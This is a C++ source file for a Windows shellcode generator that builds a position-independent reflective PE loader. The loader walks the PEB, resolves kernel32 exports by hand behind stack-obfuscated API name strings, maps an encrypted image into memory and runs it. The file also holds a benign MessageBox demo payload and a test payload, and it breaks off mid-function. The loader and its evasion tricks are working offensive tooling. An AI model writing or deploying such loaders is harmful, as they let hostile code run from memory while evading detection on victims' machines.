#include "cmn.h"

#include <windows.h>

#include <iostream>
#include <string>
#include <cassert>

// `prepare` operation crypts your MZ on disk
#define KEY_INIT 0xe953eb7d
#define KEY_MUL 0x7e39a3c9


static void usage() {
  static const char* const this_prog =
#ifdef _WIN64
    "p2gen64"
#else
    "p2gen32"
#endif
    ;
  printf("Usage: %s <gen-mz|gen-demo|gen-tbdemo|fork-mz|fork-demo|fork-tbdemo|fork-mz-prepared|prepare-mz> <file> [0xRVA]\n", this_prog);
  printf("0xRVA = PostCall RVA for fork-mz\n");
}


#ifdef _WIN64
#define IMAGE_BASE_ALIGN_MASK 0xFFFFFFFFFFFF0000
#define SIG_BIT_IS_SET(x) (x & 0x8000000000000000)
#define CLEAR_SIG_BIT(x) (x & 0x7FFFFFFFFFFFFFFF)
#else
#define IMAGE_BASE_ALIGN_MASK 0xFFFF0000
#define SIG_BIT_IS_SET(x) (x & 0x80000000)
#define CLEAR_SIG_BIT(x) (x & 0x7FFFFFFF)
#endif

#define PAGE_SIZE 4096

typedef UINT(WINAPI* LPFN_ExeEntry)();
typedef BOOL(WINAPI* LPFN_DllMain)(HMODULE, DWORD, LPVOID);
typedef VOID(WINAPI/*no args*/* LPFN_PostcallFn)();

typedef FARPROC(WINAPI* LPFN_GetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LPFN_LoadLibraryExA)(LPCSTR, HANDLE, DWORD);
typedef BOOL(WINAPI* LPFN_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* LPFN_VirtualFree)(LPVOID, SIZE_T, DWORD dwFreeType);
//typedef void (WINAPI* LPFN_ExitThread)(DWORD);
typedef LPVOID(WINAPI* LPFN_VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* LPFN_HeapFree)(HANDLE, DWORD, LPVOID);
typedef LPVOID(WINAPI* LPFN_GetProcessHeap)();

typedef BOOL (WINAPI* LPFN_SetEnvironmentVariableA)(LPCSTR lpName, LPCSTR lpValue);
typedef BOOL(WINAPI* LPFN_Beep)(DWORD dwFreq, DWORD dwDuration);

using namespace std;

// Phase2 loader code (position-independent)
// Note: returning DWORD_PTR although main() can only return 4 byte int
// Note: must be compiled with Enable Security Check = No ; to prevent security_check_cookie insertion
// dwP2CodeFlags => 1: free heap
// dwP2CodePostCallRva => if not 0, call it after SUCCESS RETURN of DllMain/ExeEntry
DWORD __cdecl p2code(LPVOID lpRawImage,
                     DWORD dwP2CodeFlags,
                     DWORD dwP2CodePostCallRva,
                     PVOID* ppEvilMapped) {
  // dwP2CodeFlags
  //  1  :  Do HeapFree(lpRawImage)

  // Get kernel32/kernelbase image base
  // from PEB->LdrData->InInitializationOrderModuleList->Flink->ImageBase
  // On XP, it will be kernel32. On >= Vista, it will be kernelbase.
  // kernelbase does not contain LoadLibraryA, but both of them contain
  // LoadLibraryExA so the last one is used.
  const void* kernel32_base;

#ifdef _WIN64
  LIST_ENTRY* phead = (LIST_ENTRY*)(*(DWORD_PTR*)(__readgsqword(0x60) + 0x18) + 0x30);
#else
  LIST_ENTRY* phead = (LIST_ENTRY*)(*(DWORD_PTR*)(__readfsdword(0x30) + 0xc) + 0x1c);
#endif

  // Some processes can have < than two loaded modules.
  // For example, smss.exe on win7 has only ntdll.dll in its
  // InInitializationOrderModuleList. This is why this code checks
  // for such conditions. The end of the list is reached when
  // current Flink points to list head.
  // See ntdll!LdrpCheckForLoadedDll().

  LIST_ENTRY* pnext = phead->Flink;
  if (pnext == phead) {
    return -500;
  }
  pnext = pnext->Flink;
  if (pnext == phead) {
    return -501;
  }
#ifdef _WIN64
  kernel32_base = *(void**)((DWORD_PTR)pnext + 0x10);
#else
  kernel32_base = *(void**)((DWORD_PTR)pnext + 0x8);
#endif

  // For sure.
  if (kernel32_base == NULL) {
    return -502;
  }


  // --------------------------------------------------------------------------------------------
  // Get headers
  PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)((DWORD_PTR)lpRawImage);
  PIMAGE_NT_HEADERS lpNtHdrs = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpRawImage + lpDosHdr->e_lfanew);
  PIMAGE_OPTIONAL_HEADER lpOptHdr = &lpNtHdrs->OptionalHeader;
  PIMAGE_SECTION_HEADER lpSecHdrs = (PIMAGE_SECTION_HEADER)((DWORD_PTR)lpOptHdr
                        + lpNtHdrs->FileHeader.SizeOfOptionalHeader);


  // --------------------------------------------------------------------------------------------
  // Find GetProcAddress
  LPFN_GetProcAddress lpfnGetProcAddress = NULL;
  {
    PIMAGE_EXPORT_DIRECTORY ExpDir;
    PIMAGE_OPTIONAL_HEADER optHdr;
    PIMAGE_DOS_HEADER pdh = (PIMAGE_DOS_HEADER)((DWORD_PTR)kernel32_base);
    PIMAGE_NT_HEADERS pnh = (PIMAGE_NT_HEADERS)((DWORD_PTR)kernel32_base + pdh->e_lfanew);
    optHdr = &pnh->OptionalHeader;
    DWORD ExpTblLen = optHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    DWORD ExpTblRva = optHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    ExpDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)kernel32_base + ExpTblRva);
    DWORD* pNames = (DWORD*)((DWORD_PTR)kernel32_base + ExpDir->AddressOfNames);
    PUSHORT pOrds = (PUSHORT)((DWORD_PTR)kernel32_base + ExpDir->AddressOfNameOrdinals);
    bool forwarded = false;
    PULONG pEntries = (PULONG)((DWORD_PTR)kernel32_base + ExpDir->AddressOfFunctions);
    ULONG idx = -1;
    for (ULONG i = 0; i < ExpDir->NumberOfNames; i++) {
      const char* xname = (LPCSTR)((DWORD_PTR)kernel32_base + pNames[i]);
      if (xname[0] == 'G' && xname[1] == 'e' && xname[2] == 't' &&
          xname[3] == 'P' && xname[4] == 'r' && xname[5] == 'o'
          && xname[6] == 'c' && xname[7] == 'A' && xname[8] == 'd')
      {
        forwarded = (pEntries[pOrds[i]] >= ExpTblRva && pEntries[pOrds[i]] <= ExpTblRva + ExpTblLen);
        lpfnGetProcAddress = (LPFN_GetProcAddress)((DWORD_PTR)kernel32_base + pEntries[pOrds[i]]);
        break;
      }
    }
  }
  if (lpfnGetProcAddress == NULL) {
    return -503;
  }

  // Find other kernel exports - make API name strings

  char s1[32], s2[32], /*s3[32], s4[32], s5[32],*/ s6[32], s7[32];

  *(unsigned*)&s1[0] = 'daoL'; *(unsigned*)&s1[4] = 'rbiL';
  *(unsigned*)&s1[8] = 'Eyra'; *(unsigned*)&s1[12] = 'Ax';

  *(unsigned*)&s2[0] = 'triV'; *(unsigned*)&s2[4] = 'Plau';
  *(unsigned*)&s2[8] = 'etor'; *(unsigned*)&s2[12] = 'tc';

  *(unsigned*)&s6[0] = 'triV'; *(unsigned*)&s6[4] = 'Flau';
  *(unsigned*)&s6[8] = '\0eer';

  *(unsigned*)&s7[0] = 'triV'; *(unsigned*)&s7[4] = 'Alau';
  *(unsigned*)&s7[8] = 'coll'; *(unsigned*)&s7[12] = 0;

  // Find other kernel exports.
  LPFN_LoadLibraryExA lpfnLoadLibraryExA = (LPFN_LoadLibraryExA)lpfnGetProcAddress((HMODULE)kernel32_base, s1);
  LPFN_VirtualProtect lpfnVirtualProtect = (LPFN_VirtualProtect)lpfnGetProcAddress((HMODULE)kernel32_base, s2);
  LPFN_VirtualFree lpfnVirtualFree = (LPFN_VirtualFree)lpfnGetProcAddress((HMODULE)kernel32_base, s6);
  LPFN_VirtualAlloc lpfnVirtualAlloc = (LPFN_VirtualAlloc)lpfnGetProcAddress((HMODULE)kernel32_base, s7);

  LPFN_HeapFree lpfnHeapFree = 0;
  LPFN_GetProcessHeap lpfnGetProcessHeap = 0;

  // Additional exports if needed
  if (dwP2CodeFlags & 1) {
    char s8[32], s9[32];

    *(unsigned*)&s8[0] = 'paeH'; *(unsigned*)&s8[4] = 'eerF';
    *(unsigned*)&s8[8] = 0;

    *(unsigned*)&s9[0] = 'PteG'; *(unsigned*)&s9[4] = 'ecor';
    *(unsigned*)&s9[8] = 'eHss'; *(unsigned*)&s9[12] = '\0pa\0';

    lpfnHeapFree = (LPFN_HeapFree)lpfnGetProcAddress((HMODULE)kernel32_base, s8);
    lpfnGetProcessHeap = (LPFN_GetProcessHeap)lpfnGetProcAddress((HMODULE)kernel32_base, s9);
  }


  // --------------------------------------------------------------------------------------------
  // Setup image
  LPVOID lpMappedImage = lpfnVirtualAlloc(
    NULL, lpOptHdr->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
  );
  if (!lpMappedImage) {
    return -504;
  }
  if (ppEvilMapped) {
    *ppEvilMapped = lpMappedImage;
  }

  // Copy headers
  //memcpy(lpMappedImage, lpRawImage, lpOptHdr->SizeOfHeaders);
  if (ALIGN_UP(lpOptHdr->SizeOfHeaders, 4) != lpOptHdr->SizeOfHeaders) {
    return -9876;
  }
  for (DWORD i = 0; i < lpOptHdr->SizeOfHeaders / 4; i++) {
    *(DWORD*)((DWORD_PTR)lpMappedImage + i*4) = *(DWORD*)((DWORD_PTR)lpRawImage + i*4);
  }

  // Copy sections
  for (DWORD i = 0; i < lpNtHdrs->FileHeader.NumberOfSections; i++) {
    void* SecMapped = (void*)((DWORD_PTR)lpMappedImage + lpSecHdrs[i].VirtualAddress);
    void* SecRaw = (void*)((DWORD_PTR)lpRawImage + lpSecHdrs[i].PointerToRawData);
    DWORD dwSecDataSize = lpSecHdrs[i].SizeOfRawData;
    DWORD dwSecAlignedVSize = ALIGN_UP(lpSecHdrs[i].Misc.VirtualSize, PAGE_SIZE);

    if (!dwSecDataSize) {
      // Uninitialized data
      //memset(SecMapped, dwSecAlignedVSize, '\0');
      for (DWORD i = 0; i < dwSecAlignedVSize / 4; i++) {
        *(DWORD*)((DWORD_PTR)SecMapped + i*4) = 0;
      }
      continue;
    }
    //memcpy(SecMapped, SecRaw, dwSecDataSize);
    if (ALIGN_UP(dwSecDataSize, 4) != dwSecDataSize) {
      return -9877;
    }
    // copy from end to beginning to disable memset replacement
    for (DWORD i = 0; i < dwSecDataSize / 4; i++) {
      *(DWORD*)((DWORD_PTR)SecMapped + i*4) = *(DWORD*)((DWORD_PTR)SecRaw + i*4);
    }

    // Padding
    DWORD dwPaddingSize = dwSecAlignedVSize - dwSecDataSize;
    //memset((void*)((DWORD_PTR)SecMapped + dwSecDataSize), '\0', dwPaddingSize);
    BYTE* lpPadStart = (BYTE*)((DWORD_PTR)SecMapped + dwSecDataSize);
    for (DWORD i = 1; i < dwPaddingSize; i+=2) {
      // prevent memset insertion
      i -= 1;
      lpPadStart[i] = 0;
    }
  }

  // --------------------------------------------------------------------------------------------
  // Process relocs 
  DWORD dwBaserelocDirSize = lpOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
  DWORD dwBaserelocDirVa = lpOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
  if (!dwBaserelocDirSize) {
    goto RelocsDone;
  }
  // From ReflectiveLoader.c
  // STEP 5: process all of our images relocations...

  DWORD_PTR RelocDelta;
  PIMAGE_BASE_RELOCATION lpRelocEntry;
  DWORD_PTR dwNumberOfRelocBlocks;
  DWORD_PTR dwTotalNumberOfRelocs;

  // calculate the base address delta and perform relocations (even if we load at desired image base)
  RelocDelta = (DWORD_PTR)lpMappedImage - lpOptHdr->ImageBase;
  // lpRelocEntry is now the first entry (IMAGE_BASE_RELOCATION)
  lpRelocEntry = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)lpMappedImage +
      lpNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
  dwNumberOfRelocBlocks = 0;
  dwTotalNumberOfRelocs = 0;

  // and we itterate through all entries...
  while (lpRelocEntry->SizeOfBlock) {

    typedef struct {
      WORD	offset : 12;
      WORD	type : 4;
    } IMAGE_RELOC, * PIMAGE_RELOC;

    if (lpRelocEntry->VirtualAddress > lpOptHdr->SizeOfImage - 4) {
      break;
    }

    // lpPtrToFix = the VA for this relocation block
    void* lpPtrToFix = (void*)((DWORD_PTR)lpMappedImage
                               + lpRelocEntry->VirtualAddress);

    // NumRelocs = number of entries in this relocation block
    DWORD_PTR NumRelocs = ((lpRelocEntry->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC));

    // lpEntry is now the first entry in the current relocation block
    PIMAGE_RELOC lpEntry = (PIMAGE_RELOC)((DWORD_PTR)lpRelocEntry + sizeof(IMAGE_BASE_RELOCATION));

    // we itterate through all the entries in the current block...
    while (NumRelocs--) {
      // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
      // we dont use a switch statement to avoid the compiler building a jump table
      // which would not be very position independent!
      if (lpEntry->type == IMAGE_REL_BASED_DIR64)
        *(ULONG_PTR*)((DWORD_PTR)lpPtrToFix + lpEntry->offset) += RelocDelta;
      else if (lpEntry->type == IMAGE_REL_BASED_HIGHLOW)
        *(DWORD*)((DWORD_PTR)lpPtrToFix + lpEntry->offset) += (DWORD)RelocDelta;
      else if (lpEntry->type == IMAGE_REL_BASED_HIGH)
        *(WORD*)((DWORD_PTR)lpPtrToFix + lpEntry->offset) += HIWORD(RelocDelta);
      else if (lpEntry->type == IMAGE_REL_BASED_LOW)
        *(WORD*)((DWORD_PTR)lpPtrToFix + lpEntry->offset) += LOWORD(RelocDelta);

      // get the next entry in the current relocation block
      lpEntry = (PIMAGE_RELOC)((DWORD_PTR)lpEntry + sizeof(IMAGE_RELOC));

      dwTotalNumberOfRelocs += 1;
    }

    // get the next entry in the relocation directory
    lpRelocEntry = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)lpRelocEntry
        + lpRelocEntry->SizeOfBlock);

    dwNumberOfRelocBlocks += 1;
  }
RelocsDone:

  // Protect sections
  for (DWORD i = 0; i < lpNtHdrs->FileHeader.NumberOfSections; i++) {
    void* SecMapped = (void*)((DWORD_PTR)lpMappedImage + lpSecHdrs[i].VirtualAddress);
    DWORD dwSecAlignedVSize = ALIGN_UP(lpSecHdrs[i].Misc.VirtualSize, PAGE_SIZE);
    DWORD dwOldProtect;

    DWORD dwSecProtect = PAGE_READONLY;
    DWORD dwSecChars = lpSecHdrs[i].Characteristics;
    if (dwSecChars & IMAGE_SCN_MEM_EXECUTE) {
      if (dwSecChars & IMAGE_SCN_MEM_READ) {
        if (dwSecChars & IMAGE_SCN_MEM_WRITE) {
          dwSecProtect = PAGE_EXECUTE_READWRITE;
        } else {
          dwSecProtect = PAGE_EXECUTE_READ;
        }
      } else {
        if (dwSecChars & IMAGE_SCN_MEM_WRITE) {
          dwSecProtect = PAGE_EXECUTE_WRITECOPY;
        }
      }
    }
    else {
      if (dwSecChars & IMAGE_SCN_MEM_READ) {
        if (dwSecChars & IMAGE_SCN_MEM_WRITE) {
          dwSecProtect = PAGE_READWRITE;
        } else {
          dwSecProtect = PAGE_READONLY;
        }
      } else {
        if (dwSecChars & IMAGE_SCN_MEM_WRITE) {
          dwSecProtect = PAGE_WRITECOPY;
        }
      }
    }
    if (!lpfnVirtualProtect(SecMapped, dwSecAlignedVSize, dwSecProtect, &dwOldProtect)) {
      return -505;
    }
  }


  // --------------------------------------------------------------------------------------------
  // Process imports
  if (lpOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
      && lpOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
  {
    IMAGE_IMPORT_DESCRIPTOR* id =
      (IMAGE_IMPORT_DESCRIPTOR*)((DWORD_PTR)lpMappedImage
                                 + lpOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    IMAGE_THUNK_DATA* originalThunk, * thunk;
    IMAGE_IMPORT_BY_NAME* byName;

    while (id->Characteristics) {
    //while (id->Characteristics || id != NULL) {
      //if (id->Name == NULL) {
      //  break;
      //}
      LPCSTR lpLibName = (LPCSTR)((DWORD_PTR)lpMappedImage + ((ULONG)id->Name));
      PVOID hImportLib = lpfnLoadLibraryExA(lpLibName, NULL, 0);
      if (!hImportLib) {
        return -506;
      }
      thunk = (IMAGE_THUNK_DATA*)((DWORD_PTR)lpMappedImage + id->FirstThunk);
      originalThunk = (IMAGE_THUNK_DATA*)((DWORD_PTR)lpMappedImage + id->OriginalFirstThunk);
      while (originalThunk->u1.Ordinal) {
        LPCSTR lpFuncName;
        BOOL bOrdinal = FALSE;
        if (SIG_BIT_IS_SET(originalThunk->u1.Ordinal)) {
          lpFuncName = (LPCSTR)(CLEAR_SIG_BIT((DWORD_PTR)originalThunk->u1.Ordinal));
          bOrdinal = TRUE;
        }
        else {
          byName = (IMAGE_IMPORT_BY_NAME*)((DWORD_PTR)lpMappedImage + originalThunk->u1.AddressOfData);
          lpFuncName = (LPCSTR)byName->Name;
        }
        DWORD old;
        if (!lpfnVirtualProtect(&thunk->u1.Function, sizeof(DWORD_PTR), PAGE_READWRITE, &old)) {
          return -507;
        }
        thunk->u1.Function = (DWORD_PTR)lpfnGetProcAddress((HMODULE)hImportLib, lpFuncName);
        if (thunk->u1.Function == NULL) {
          return -508;
        }
        if (!lpfnVirtualProtect(&thunk->u1.Function, sizeof(DWORD_PTR), old, &old)) {
          return -509;
        }
        originalThunk++;
        thunk++;
      }
      id++;
    }
  }

  // --------------------------------------------------------------------------------------------
  // Save some headers before freeing the heap
  PVOID EntryPoint = (PVOID)((DWORD_PTR)lpMappedImage + lpOptHdr->AddressOfEntryPoint);
  DWORD dwSizeOfImage = lpOptHdr->SizeOfImage;
  DWORD dwCharacteristics = lpNtHdrs->FileHeader.Characteristics;

  // Free heap if the flag is set
  if (dwP2CodeFlags & 1) {
    lpfnHeapFree(lpfnGetProcessHeap(), 0, lpRawImage);
    lpRawImage = 0;
  }
  DWORD dwEntryRet;

  if (dwCharacteristics & IMAGE_FILE_DLL) {
    // DLL
    LPFN_DllMain lpfnDllMain = (LPFN_DllMain)EntryPoint;
    dwEntryRet = (DWORD_PTR)lpfnDllMain((HMODULE)lpMappedImage, DLL_PROCESS_ATTACH, NULL);

    // Maybe flag.
    if ((BOOL)dwEntryRet != FALSE) {
      // Success from DllMain()
      if (dwP2CodePostCallRva != 0) {
        LPFN_PostcallFn postcallfn = (LPFN_PostcallFn)((DWORD_PTR)lpMappedImage + dwP2CodePostCallRva); // don't confuse with other things

        // Do a postcall.
        postcallfn();
      }
    }
    else {
      // FAIL from DllMain()
      // If DllMain() returned FALSE, call it with DLL_PROCESS_DETACH
      // like Windows does.
      lpfnDllMain((HMODULE)lpMappedImage, DLL_PROCESS_DETACH, NULL);

      // And then unload it.
      lpfnVirtualFree(lpMappedImage, dwSizeOfImage, MEM_DECOMMIT);
      lpfnVirtualFree(lpMappedImage, 0, MEM_RELEASE);
    }
  }
  else {
    // EXE
    LPFN_ExeEntry lpfnExeEntry = (LPFN_ExeEntry)EntryPoint;
    dwEntryRet = lpfnExeEntry();
  }
  // NOTE: p2code itself won't be freed

  return dwEntryRet;
}

// Marker
int p2code_end() {
  return 123;
}

// -----------------------------------

DWORD __cdecl democode() {
  // Same beginning as p2code

  const void* kernel32_base;

#ifdef _WIN64
  LIST_ENTRY* phead = (LIST_ENTRY*)(*(DWORD_PTR*)(__readgsqword(0x60) + 0x18) + 0x30);
#else
  LIST_ENTRY * phead = (LIST_ENTRY*)(*(DWORD_PTR*)(__readfsdword(0x30) + 0xc) + 0x1c);
#endif

  LIST_ENTRY * pnext = phead->Flink;
  if (pnext == phead) {
    return -500;
  }
  pnext = pnext->Flink;
  if (pnext == phead) {
    return -501;
  }
#ifdef _WIN64
  kernel32_base = *(void**)((DWORD_PTR)pnext + 0x10);
#else
  kernel32_base = *(void**)((DWORD_PTR)pnext + 0x8);
#endif
  if (kernel32_base == NULL) {
    return -502;
  }
  LPFN_GetProcAddress lpfnGetProcAddress = NULL;
  {
    PIMAGE_EXPORT_DIRECTORY ExpDir;
    PIMAGE_OPTIONAL_HEADER optHdr;
    PIMAGE_DOS_HEADER pdh = (PIMAGE_DOS_HEADER)((DWORD_PTR)kernel32_base);
    PIMAGE_NT_HEADERS pnh = (PIMAGE_NT_HEADERS)((DWORD_PTR)kernel32_base + pdh->e_lfanew);
    optHdr = &pnh->OptionalHeader;
    DWORD ExpTblLen = optHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    DWORD ExpTblRva = optHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    ExpDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)kernel32_base + ExpTblRva);
    DWORD * pNames = (DWORD*)((DWORD_PTR)kernel32_base + ExpDir->AddressOfNames);
    PUSHORT pOrds = (PUSHORT)((DWORD_PTR)kernel32_base + ExpDir->AddressOfNameOrdinals);
    bool forwarded = false;
    PULONG pEntries = (PULONG)((DWORD_PTR)kernel32_base + ExpDir->AddressOfFunctions);
    ULONG idx = -1;
    for (ULONG i = 0; i < ExpDir->NumberOfNames; i++) {
      const char* xname = (LPCSTR)((DWORD_PTR)kernel32_base + pNames[i]);
      if (xname[0] == 'G' && xname[1] == 'e' && xname[2] == 't' &&
        xname[3] == 'P' && xname[4] == 'r' && xname[5] == 'o'
        && xname[6] == 'c' && xname[7] == 'A' && xname[8] == 'd')
      {
        forwarded = (pEntries[pOrds[i]] >= ExpTblRva && pEntries[pOrds[i]] <= ExpTblRva + ExpTblLen);
        lpfnGetProcAddress = (LPFN_GetProcAddress)((DWORD_PTR)kernel32_base + pEntries[pOrds[i]]);
        break;
      }
    }
  }
  if (lpfnGetProcAddress == NULL) {
    return -503;
  }
  // Find other kernel exports - make API name strings
  char s1[32];
  char u1[32], u2[32];

  // "LoadLibraryA"
  *(unsigned*)& s1[0] = 'daoL'; *(unsigned*)& s1[4] = 'rbiL';
  *(unsigned*)& s1[8] = 'Eyra'; *(unsigned*)& s1[12] = 'Ax';

  // "user32.dll"
  *(unsigned*)& u1[0] = 'resu'; *(unsigned*)& u1[4] = 'd.23';
  *(unsigned*)& u1[8] = 'll';
  // "MessageBoxA"
  *(unsigned*)& u2[0] = 'sseM'; *(unsigned*)& u2[4] = 'Bega';
  *(unsigned*)& u2[8] = 'Axo';

  // Find other kernel exports.
  LPFN_LoadLibraryExA lpfnLoadLibraryExA = (LPFN_LoadLibraryExA)lpfnGetProcAddress((HMODULE)kernel32_base, s1);

  HMODULE hUser32 = lpfnLoadLibraryExA(u1, 0, 0);
  if (!hUser32) {
    return -7910;
  }

  typedef DWORD(WINAPI * LPFN_MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
  LPFN_MessageBoxA lpfnMessageBoxA;
  lpfnMessageBoxA = (LPFN_MessageBoxA)lpfnGetProcAddress(hUser32, u2);
  if (!lpfnMessageBoxA) {
    return -7920;
  }

  return lpfnMessageBoxA(HWND_DESKTOP, u1, u2, MB_ICONEXCLAMATION);
}

int democode_end() {
  return 456;
}

// -----------------------------------

// TBDemo - shellcode for testbin/paytest mechanics, sets env var(s) and returns magic value

DWORD __cdecl tbdemocode() {
  // Same beginning as democode

  const void* kernel32_base;

#ifdef _WIN64
  LIST_ENTRY* phead = (LIST_ENTRY*)(*(DWORD_PTR*)(__readgsqword(0x60) + 0x18) + 0x30);
#else
  LIST_ENTRY * phead = (LIST_ENTRY*)(*(DWORD_PTR*)(__readfsdword(0x30) + 0xc) + 0x1c);
#endif

  LIST_ENTRY * pnext = phead->Flink;
  if (pnext == phead) {
    return -500;
  }
  pnext = pnext->Flink;
  if (pnext == phead) {
    return -501;
  }
#ifdef _WIN64
  kernel32_base = *(void**)((DWORD_PTR)pnext + 0x10);
#else
  kernel32_base = *(void**)((DWORD_PTR)pnext + 0x8);
#endif
  if (kernel32_base == NULL) {
    return -502;
  }
  // lpfnGetProcAddress ------- not used now. But I'm leaving it here for possible future
  LPFN_GetProcAddress lpfnGetProcAddress = NULL;
  LPFN_SetEnvironmentVariableA lpfnSetEnvironmentVariableA = NULL;
  LPFN_Beep lpfnBeep = NULL;
  {
    PIMAGE_EXPORT_DIRECTORY ExpDir;
    PIMAGE_OPTIONAL_HEADER optHdr;
    PIMAGE_DOS_HEADER pdh = (PIMAGE_DOS_HEADER)((DWORD_PTR)kernel32_base);
    PIMAGE_NT_HEADERS pnh = (PIMAGE_NT_HEADERS)((DWORD_PTR)kernel32_base + pdh->e_lfanew);
    optHdr = &pnh->OptionalHeader;
    DWORD ExpTblLen = optHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    DWORD ExpTblRva = optHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    ExpDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)kernel32_base + ExpTblRva);
    DWORD * pNames = (DWORD*)((DWORD_PTR)kernel32_base + ExpDir->AddressOfNames);
    PUSHORT pOrds = (PUSHORT)((DWORD_PTR)kernel32_base + ExpDir->AddressOfNameOrdinals);
    bool forwarded = false;
    PULONG pEntries = (PULONG)((DWORD_PTR)kernel32_base + ExpDir->AddressOfFunctions);
    ULONG idx = -1;
    for (ULONG i = 0; i < ExpDir->NumberOfNames; i++) {
      if (lpfnGetProcAddress && lpfnSetEnvironmentVariableA) {
        // Both APIs resolved, success. Don't search anymore.
        break;
      }
      const char* xn = (LPCSTR)((DWORD_PTR)kernel32_base + pNames[i]);
      if (xn[0] == 'G' && xn[1] == 'e' && xn[2] == 't' && xn[3] == 'P' && xn[4] == 'r' && xn[5] == 'o'
          && xn[6] == 'c' && xn[7] == 'A' && xn[8] == 'd')
      {
        forwarded = (pEntries[pOrds[i]] >= ExpTblRva && pEntries[pOrds[i]] <= ExpTblRva + ExpTblLen);
        lpfnGetProcAddress = (LPFN_GetProcAddress)((DWORD_PTR)kernel32_base + pEntries[pOrds[i]]);
      }
      if (xn[0] == 'S' && xn[1] == 'e' && xn[2] == 't' && xn[3] == 'E' && xn[4] == 'n' && xn[5] == 'v' && xn[6] == 'i' && xn[7] == 'r' && xn[8] == 'o' &&
          xn[9] == 'n' && xn[10] == 'm' && xn[11] == 'e' && xn[12] == 'n' && xn[13] == 't' &&
          xn[14] == 'V' && xn[15] == 'a' && xn[16] == 'r' && xn[17] == 'i' && xn[18] == 'a' && xn[19] == 'b' && xn[20] == 'l' && xn[21] == 'e' && xn[22] == 'A') {
        forwarded = (pEntries[pOrds[i]] >= ExpTblRva && pEntries[pOrds[i]] <= ExpTblRva + ExpTblLen);
        lpfnSetEnvironmentVariableA = (LPFN_SetEnvironmentVariableA)((DWORD_PTR)kernel32_base + pEntries[pOrds[i]]);
      }
      if (xn[0] == 'B' && xn[1] == 'e' && xn[2] == 'e' && xn[3] == 'p' && xn[4] == '\0') {
        lpfnBeep = (LPFN_Beep)((DWORD_PTR)kernel32_base + pEntries[pOrds[i]]);
      }
    }
  }
  if (lpfnGetProcAddress == NULL) {
    return -503;
  }

  /*
  This is the thing tested by paytest mechanisms: set env var __SHELLCODE_CALLED to 1
  */
  char s1[32], s2[8];
  *(unsigned*)&s1[0] = 'HS__'; *(unsigned*)&s1[4] = 'CLLE';
  *(unsigned*)&s1[8] = '_EDO'; *(unsigned*)&s1[12] = 'LLAC';
  *(unsigned*)&s1[16] = 'DE';
  *(unsigned*)&s2[0] = '1';
  lpfnSetEnvironmentVariableA(s1, s2);

  lpfnBeep(300, 500);

  /*
  This return code is checked too
  */
  return 12000;
}

int tbdemocode_end() {
  return 789;
}

// ---------------------------------------------------------------------------------------------

static void generate_mz_p2(std::string& code) {
  size_t code_size = (DWORD_PTR)p2code_end - (DWORD_PTR)p2code;
  // Insert for fun
  uint16_t c = 0x4840; // inc eax ; dec eax  instead of nop
  code.append((char*)&c, 2);
  code.append((char*)p2code, code_size);
}

static void generate_demo(std::string& code) {
  size_t democode_size = (DWORD_PTR)democode_end - (DWORD_PTR)democode;
  code.append((char*)democode, democode_size);
}

static void generate_TESTBIN_demo(std::string& code) {
  size_t tbdemocode_size = (DWORD_PTR)tbdemocode_end - (DWORD_PTR)tbdemocode;
  code.append((char*)tbdemocode, tbdemocode_size);
}

// ---

static int genmz_main(int argc, wchar_t* argv[]) {
  if (argc != 2) {
    return usage(), 1;
  }
  wchar_t* outfile = argv[1];
  std::string code;

  generate_mz_p2(code);

  write_entire_file(outfile, code);
  return 0;
}

static int gendemo_main(int argc, wchar_t* argv[]) {
  if (argc != 2) {
    return usage(), 1;
  }
  wchar_t* outfile = argv[1];
  std::string code;

  generate_demo(code);

  write_entire_file(outfile, code);

  return 0;
}

static int gen_TESTBIN_demo_main(int argc, wchar_t* argv[]) {
  if (argc != 2) {
    return usage(), 1;
  }
  wchar_t* outfile = argv[1];
  std::string code;

  generate_TESTBIN_demo(code);

  write_entire_file(outfile, code);

  return 0;
}

// ---

static int forkmz_main_work(bool decrypt, int argc, wchar_t* argv[]) {
  if (argc != 2 && argc != 3) {
    return usage(), 1;
  }
  wchar_t* infile = argv[1];
  unsigned int dwPostcallRva = 0;
  if (argc == 3) {
    wchar_t* postcallrva = argv[2];
    dwPostcallRva = stoul(postcallrva, nullptr, 16); // this thing throws if bad shit
  }
  string data;
  read_entire_file(infile, data);

  wcout << L"File size: " << data.length() << L" bytes\n";
  wcout << "\n";

  if (decrypt) {
    printf("Decrypting (I remember, KEY_INIT=0x%08X and KEY_MUL=0x%08X\n", KEY_INIT, KEY_MUL);

    if (data.length() % 4 != 0) {
      printf("must be aligned to dword\n");
      return -1;
    }
    DWORD* lpdw = (DWORD*)data.c_str();
